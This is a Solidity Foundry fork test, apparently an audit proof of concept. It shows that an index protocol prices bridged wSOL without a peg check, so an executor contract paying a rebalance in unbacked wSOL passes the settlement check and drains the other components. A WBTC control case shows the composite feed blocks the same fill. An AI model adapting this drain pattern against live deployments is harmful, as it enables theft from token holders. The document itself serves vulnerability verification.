// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {console2} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {IndexFactory} from "../../src/IndexFactory.sol";
import {IndexToken} from "../../src/IndexToken.sol";
import {IIndexFactory} from "../../src/interfaces/IIndexFactory.sol";
import {IIndexRule} from "../../src/interfaces/IIndexRule.sol";
import {IIndexToken} from "../../src/interfaces/IIndexToken.sol";
import {IRebalanceExecutor} from "../../src/interfaces/IRebalanceExecutor.sol";
import {IAggregatorV3} from "../../src/interfaces/IAggregatorV3.sol";
import {CompositeFeed} from "../../src/CompositeFeed.sol";
import {ConfigureWhitelist} from "../../script/ConfigureWhitelist.s.sol";
import {MainnetAddresses as M} from "../../script/MainnetAddresses.sol";
import {ForkFeeds} from "../fork/ForkFeeds.sol";

interface IWstETH {
    function stEthPerToken() external view returns (uint256);
}

/// @dev An executor that holds the "unbacked" wSOL a bridge exploit minted (dealt to it for free) and fills whatever
///      the index asks for out of its own balance.
contract FreeWsolExecutor is IRebalanceExecutor {
    using SafeERC20 for IERC20;

    function fill(IndexToken index) external {
        index.executeRebalance("");
    }

    function onXindexRebalance(uint256[] calldata, uint256[] calldata amountsIn, bytes calldata) external {
        address[] memory t = IndexToken(msg.sender).componentTokens();
        for (uint256 i = 0; i < t.length; ++i) {
            if (amountsIn[i] != 0) IERC20(t[i]).safeTransfer(msg.sender, amountsIn[i]);
        }
    }
}

/// @notice Verifier PoC for "wSOL has no peg leg": the default list prices Wormhole wSOL from SOL/USD alone, so a
///         depeg of the bridged token is invisible to the rule and to the DA-05 settlement check, while WBTC's
///         composite peg leg makes the same check refuse a fill paid in a depegged wrapper.
contract WsolAtParTest is ForkFeeds {
    using SafeERC20 for IERC20;

    IndexFactory factory;
    IIndexRule rule;
    CompositeFeed wbtcFeed;
    address guardian = makeAddr("guardian");
    address alice = makeAddr("alice");
    address[] tokens;

    uint256 constant I_WETH = 0;
    uint256 constant I_WBTC = 2;
    uint256 constant I_WSOL = 3;

    function setUp() public {
        vm.createSelectFork("https://ethereum-rpc.publicnode.com");
        factory = new IndexFactory(address(this), guardian);
        rule = IIndexRule(factory.RULE());

        // Real feed answers from the fork block, re-dated to the block clock so the warps below do not stale them.
        _pinFeedsToTheBlockClock();
        wbtcFeed = new CompositeFeed(
            IAggregatorV3(M.BTC_USD_FEED), IAggregatorV3(M.WBTC_BTC_FEED), M.STALENESS_1H, M.STALENESS_24H
        );

        // The shipped default list, exactly as the listing script builds it.
        ConfigureWhitelist configure = new ConfigureWhitelist();
        ConfigureWhitelist.Entry[] memory list = configure.defaultMainnetList(address(wbtcFeed));
        for (uint256 i = 0; i < list.length; ++i) {
            factory.proposeListing(list[i].token, configure.configFor(list[i]));
            tokens.push(list[i].token);
        }
        vm.warp(block.timestamp + factory.LISTING_DELAY());
        for (uint256 i = 0; i < list.length; ++i) {
            factory.executeListing(list[i].token);
        }
        assertEq(tokens[I_WBTC], M.WBTC);
        assertEq(tokens[I_WSOL], M.WSOL);
    }

    // ---------------------------------------------------------------------
    // 1. The configuration asymmetry
    // ---------------------------------------------------------------------

    function test_wsolHasNoPegLegWhileWbtcDoes() public {
        // wSOL's config is the plain SOL/USD aggregator; WBTC's is the composite whose second leg is WBTC/BTC.
        assertEq(factory.tokenConfig(M.WSOL).feed, M.SOL_USD_FEED, "wSOL is priced by SOL/USD alone");
        assertEq(factory.tokenConfig(M.WBTC).feed, address(wbtcFeed), "WBTC is priced through the composite");

        // A 99% depeg of WBTC against BTC reaches the rule's price through the peg leg.
        uint256 wbtcBefore = rule.price(M.WBTC);
        _movePinnedFeed(M.WBTC_BTC_FEED, 1, 100);
        assertApproxEqRel(rule.price(M.WBTC), wbtcBefore / 100, 0.001e18, "WBTC depeg is priced");

        // wSOL's rule price is exactly SOL/USD scaled to its 9 decimals; nothing about wSOL itself enters it. Even
        // unlimited unbacked wSOL minted on Ethereum (simulated here) leaves the rule's price untouched.
        (, int256 sol,,,) = IAggregatorV3(M.SOL_USD_FEED).latestRoundData();
        uint256 wsolBefore = rule.price(M.WSOL);
        assertEq(wsolBefore, uint256(sol) * 10 ** (36 - 8 - 9));
        deal(M.WSOL, address(0xBAD), 10_000_000e9, true); // bridge-exploit mint: 10M unbacked wSOL
        assertEq(rule.price(M.WSOL), wsolBefore, "wSOL depeg is invisible to the rule");
        console2.log("SOL/USD answer (8 dp):", uint256(sol));
    }

    /// @dev Informational: the wstETH/USD 'Calculated' feed tracks STETH/USD x stEthPerToken (on the live, unpinned
    ///      aggregators), i.e. it is a derived feed rather than a market reference price.
    function test_wstethFeedIsCalculated() public {
        vm.createSelectFork("https://ethereum-rpc.publicnode.com");
        assertEq(IAggregatorV3(M.WSTETH_USD_FEED).description(), "wstETH / USD Calculated");
        (, int256 wsteth,,,) = IAggregatorV3(M.WSTETH_USD_FEED).latestRoundData();
        address stethUsd = 0xCfE54B5cD566aB89272946F602D76Ea879CAb4a8;
        assertEq(IAggregatorV3(stethUsd).description(), "STETH / USD");
        (, int256 steth,,,) = IAggregatorV3(stethUsd).latestRoundData();
        uint256 implied = uint256(steth) * IWstETH(M.WSTETH).stEthPerToken() / 1e18;
        console2.log("wstETH/USD Calculated:", uint256(wsteth));
        console2.log("STETH/USD x stEthPerToken:", implied);
        assertApproxEqRel(uint256(wsteth), implied, 0.01e18);
    }

    // ---------------------------------------------------------------------
    // 2. The rebalance amplification
    // ---------------------------------------------------------------------

    /// @dev A capped default index whose wSOL is underweight, so the next snapshot buys wSOL. After the snapshot a
    ///      Wormhole incident makes Ethereum wSOL unbacked (worthless) while SOL/USD is unchanged. An executor pays with
    ///      free wSOL at the auction's opening multiplier, takes every other component the rebalance sells, and the
    ///      DA-05 settlement check passes because it values the wSOL at SOL's price.
    struct Run {
        uint256 outValue;
        uint256 inValueAtFeed;
        uint256 navFeedBefore;
        uint256 navFeedAfter;
        uint256 realNavBefore;
        uint256 realNavAfter;
        uint256 wsolUnitsBefore;
        uint256 wsolUnitsAfter;
    }

    Run r;
    uint256[] outs;

    function test_unbackedWsolSettlesAtParAndDrainsOtherComponents() public {
        IndexToken index = _underweightIndex(I_WSOL, "CWSOL");
        FreeWsolExecutor exec = _snapshotAndOpen(index);
        exec.fill(index);
        _record(index);

        console2.log("USD paid out in real components (WAD):", r.outValue);
        console2.log("USD received, wSOL valued at SOL/USD:", r.inValueAtFeed);
        console2.log("navPerToken at feed before / after:", r.navFeedBefore, r.navFeedAfter);
        console2.log("NAV with wSOL at 0, before / after:", r.realNavBefore, r.realNavAfter);
        console2.log("wSOL units before / after:", r.wsolUnitsBefore, r.wsolUnitsAfter);
        console2.log("index supply:", index.totalSupply());

        assertEq(index.rebalanceNonce(), 1, "the settlement passed MIN_SETTLEMENT_RATIO");
        assertGe(r.inValueAtFeed * 1e18, r.outValue * index.MIN_SETTLEMENT_RATIO());
        assertGt(r.navFeedAfter, r.navFeedBefore, "the rule believes holders gained");
        assertLt(r.realNavAfter, r.realNavBefore, "holders actually lost real components");
        // Everything the index paid out went for tokens worth nothing: the extra loss beyond the bridge loss itself.
        assertApproxEqRel((r.realNavBefore - r.realNavAfter) * index.totalSupply() / 1e18, r.outValue, 0.001e18);
        assertEq(IERC20(M.WSOL).balanceOf(address(exec)), 0);
        address[] memory t = index.componentTokens();
        for (uint256 i = 0; i < t.length; ++i) {
            if (i != I_WSOL) assertEq(IERC20(t[i]).balanceOf(address(exec)), outs[i], "executor kept them");
        }
    }

    function _snapshotAndOpen(IndexToken index) internal returns (FreeWsolExecutor exec) {
        (address[] memory t, uint256[] memory unitsBefore) = index.components();
        r.wsolUnitsBefore = unitsBefore[I_WSOL];
        vm.warp(index.lastRebalance() + index.MIN_REBALANCE_INTERVAL());
        index.startRebalance(0);
        (uint256 eta,, uint256[] memory targets) = index.pendingRebalance();
        assertGt(targets[I_WSOL], unitsBefore[I_WSOL], "the snapshot buys wSOL");

        // --- Wormhole incident after the snapshot: wSOL on Ethereum becomes unbacked; SOL/USD does not move. ---
        exec = new FreeWsolExecutor();
        vm.warp(eta); // auction opens at the 1.5 multiplier: an executor paying in worthless tokens fills at once
        (uint256 m,, uint256[] memory amountsOut, uint256[] memory amountsIn) = index.previewRebalance();
        assertEq(m, 1.5e18);
        for (uint256 i = 0; i < t.length; ++i) {
            if (i != I_WSOL) assertEq(amountsIn[i], 0, "only wSOL is bought");
        }
        outs = amountsOut;
        deal(M.WSOL, address(exec), amountsIn[I_WSOL], true); // the exploiter's unbacked wSOL
        (r.outValue, r.inValueAtFeed) = rule.settlementValues(t, amountsOut, amountsIn);
        r.navFeedBefore = rule.navPerToken(address(index));
        r.realNavBefore = _realNav(index); // wSOL at its post-incident market value, 0
    }

    function _record(IndexToken index) internal {
        r.navFeedAfter = rule.navPerToken(address(index));
        r.realNavAfter = _realNav(index);
        (, uint256[] memory unitsAfter) = index.components();
        r.wsolUnitsAfter = unitsAfter[I_WSOL];
    }

    /// @dev Control: the same scenario for WBTC. A 99% WBTC/BTC depeg after the snapshot makes the DA-05 check refuse
    ///      the fill, because the peg leg prices the delivered wrapper at its depegged value.
    function test_control_depeggedWbtcIsRefusedBySettlementCheck() public {
        IndexToken index = _underweightIndex(I_WBTC, "CWBTC");
        (, uint256[] memory unitsBefore) = index.components();
        vm.warp(index.lastRebalance() + index.MIN_REBALANCE_INTERVAL());
        index.startRebalance(0);
        (uint256 eta,, uint256[] memory targets) = index.pendingRebalance();
        assertGt(targets[I_WBTC], unitsBefore[I_WBTC], "the snapshot buys WBTC");

        _movePinnedFeed(M.WBTC_BTC_FEED, 1, 100); // custodian failure: WBTC at 1% of BTC
        FreeWsolExecutor exec = new FreeWsolExecutor();
        vm.warp(eta);
        (,,, uint256[] memory amountsIn) = index.previewRebalance();
        deal(M.WBTC, address(exec), amountsIn[I_WBTC], true);
        vm.expectPartialRevert(IIndexToken.SettlementValueTooLow.selector);
        exec.fill(index);
    }

    // ---------------------------------------------------------------------
    // helpers
    // ---------------------------------------------------------------------

    /// @dev Capped index of the seven defaults at 1,000 USD, with component `i` at 60% of its rule units.
    function _underweightIndex(uint256 i, string memory symbol) internal returns (IndexToken index) {
        uint256[] memory units = rule.initialUnits(tokens, 1, 1_000e18);
        units[i] = units[i] * 6 / 10;
        index = IndexToken(factory.createIndex(symbol, symbol, tokens, units, 1));
        uint256 shares = 1_000e18; // ~1M USD
        uint256[] memory need = index.previewIssue(shares);
        for (uint256 k = 0; k < tokens.length; ++k) {
            deal(tokens[k], alice, need[k]);
        }
        vm.startPrank(alice);
        for (uint256 k = 0; k < tokens.length; ++k) {
            IERC20(tokens[k]).forceApprove(address(index), need[k]);
        }
        index.issue(shares, alice);
        vm.stopPrank();
    }

    /// @dev Value of one index token with every component at its feed price except wSOL, taken at 0.
    function _realNav(IndexToken index) internal view returns (uint256 v) {
        (address[] memory t, uint256[] memory u) = index.components();
        for (uint256 i = 0; i < t.length; ++i) {
            if (t[i] == M.WSOL) continue;
            v += u[i] * rule.price(t[i]) / 1e18;
        }
    }
}
